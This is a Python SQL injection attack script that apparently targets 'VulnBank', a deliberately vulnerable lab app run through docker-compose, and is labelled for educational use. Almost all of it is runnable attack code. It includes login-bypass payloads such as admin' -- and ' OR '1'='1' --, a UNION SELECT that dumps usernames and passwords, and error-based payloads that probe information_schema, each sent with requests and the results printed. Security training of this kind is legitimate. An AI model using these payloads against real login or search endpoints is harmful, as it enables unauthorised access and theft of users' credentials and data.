#!/usr/bin/env python3
"""
===========================================
VulnBank — Attack Script #1: SQL Injection
===========================================
⚠️  FOR EDUCATIONAL / AUTHORIZED USE ONLY

Demonstrates:
  1. Authentication bypass via SQLi
  2. Data extraction via UNION injection
  3. Error-based information leakage
"""

import requests
import json
import sys

BASE_URL = "http://vulnbank:8080"

BOLD  = "\033[1m"
RED   = "\033[91m"
GREEN = "\033[92m"
YELLOW= "\033[93m"
RESET = "\033[0m"


def banner():
    print(f"""
{RED}╔══════════════════════════════════════════╗
║   SQL INJECTION ATTACK DEMO              ║
║   VulnBank — Educational Use Only        ║
╚══════════════════════════════════════════╝{RESET}
""")


def attack_login_bypass():
    """
    AUTH BYPASS: Login without knowing the password.

    Payload:  admin' --
    Resulting SQL:
        SELECT * FROM users
        WHERE username = 'admin' --' AND password = 'x'
        (the -- comments out the password check)
    """
    print(f"{BOLD}[1] Authentication Bypass{RESET}")
    print(f"    Payload: admin' --")

    payloads = [
        ("admin' --",          "anything", "Comment-out password"),
        ("' OR '1'='1' --",    "",         "Always-true condition"),
        ("admin'/*",           "*/--",     "Block comment bypass"),
    ]

    for username, password, description in payloads:
        resp = requests.post(
            f"{BASE_URL}/api/auth/login",
            json={"username": username, "password": password}
        )
        status = resp.status_code
        data   = resp.json()

        if status == 200 and "token" in data:
            print(f"    {GREEN}✅ [{description}] SUCCESS — logged in as: {data.get('username')} ({data.get('role')}){RESET}")
            print(f"       Token: {data['token'][:50]}...")
        else:
            print(f"    {RED}✗  [{description}] Failed — {data.get('error', 'unknown')}{RESET}")

    print()


def attack_data_extraction():
    """
    DATA EXTRACTION: Extract all users via UNION injection in search.

    Payload:  ' OR '1'='1
    Resulting SQL:
        SELECT * FROM users WHERE username LIKE '%' OR '1'='1%'
    """
    print(f"{BOLD}[2] Data Extraction — Dump All Users{RESET}")
    print(f"    Payload: ' OR '1'='1")

    resp = requests.get(
        f"{BASE_URL}/api/users/search",
        params={"q": "' OR '1'='1"}
    )

    if resp.status_code == 200:
        users = resp.json()
        print(f"    {GREEN}✅ Extracted {len(users)} users:{RESET}")
        print(f"    {'ID':<4} {'Username':<12} {'Password':<12} {'Email':<25} {'Role':<8} {'Balance'}")
        print(f"    {'-'*80}")
        for u in users:
            print(f"    {u.get('id',''):<4} {u.get('username',''):<12} "
                  f"{u.get('password',''):<12} {u.get('email',''):<25} "
                  f"{u.get('role',''):<8} {u.get('balance','')}")
    else:
        print(f"    {RED}✗  Failed: {resp.text[:200]}{RESET}")
    print()


def attack_union_injection():
    """
    UNION INJECTION: Extract specific columns using UNION SELECT.

    Payload extracts username + password from users table directly.
    """
    print(f"{BOLD}[3] UNION-Based Extraction{RESET}")

    payload = "' UNION SELECT id,username,password,email,role,CAST(balance AS VARCHAR) FROM users--"
    print(f"    Payload: {YELLOW}{payload[:60]}...{RESET}")

    resp = requests.get(
        f"{BASE_URL}/api/users/search",
        params={"q": payload}
    )

    if resp.status_code == 200:
        results = resp.json()
        print(f"    {GREEN}✅ UNION injection returned {len(results)} rows{RESET}")
        for r in results:
            print(f"    → {r.get('username')}:{r.get('password')}")
    elif resp.status_code == 500:
        error_data = resp.json()
        print(f"    {YELLOW}⚠  SQL Error leaked to client:{RESET}")
        print(f"    {error_data.get('error', '')[:200]}")
        print(f"    Query: {error_data.get('query', '')[:200]}")
    print()


def attack_error_based():
    """
    ERROR-BASED: Force SQL errors to reveal database information.
    """
    print(f"{BOLD}[4] Error-Based Information Leakage{RESET}")

    payloads = [
        "' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--",
        "'; SELECT * FROM information_schema.tables--",
        "'",
    ]

    for payload in payloads:
        resp = requests.get(
            f"{BASE_URL}/api/users/search",
            params={"q": payload}
        )
        if resp.status_code == 500:
            data = resp.json()
            print(f"    {YELLOW}⚠  Error leaked: {data.get('error', '')[:150]}{RESET}")
            print(f"       Query exposed: {data.get('query', '')[:100]}")
            break
    print()


if __name__ == "__main__":
    banner()

    print(f"Target: {BASE_URL}\n")

    # Check connectivity
    try:
        requests.get(BASE_URL, timeout=3)
    except Exception as e:
        print(f"{RED}❌ Cannot connect to {BASE_URL}{RESET}")
        print(f"   Make sure the app is running: docker-compose up")
        sys.exit(1)

    attack_login_bypass()
    attack_data_extraction()
    attack_union_injection()
    attack_error_based()

    print(f"{GREEN}{'='*50}")
    print(f"Attack simulation complete.")
    print(f"See /fixes for remediation code.{RESET}")
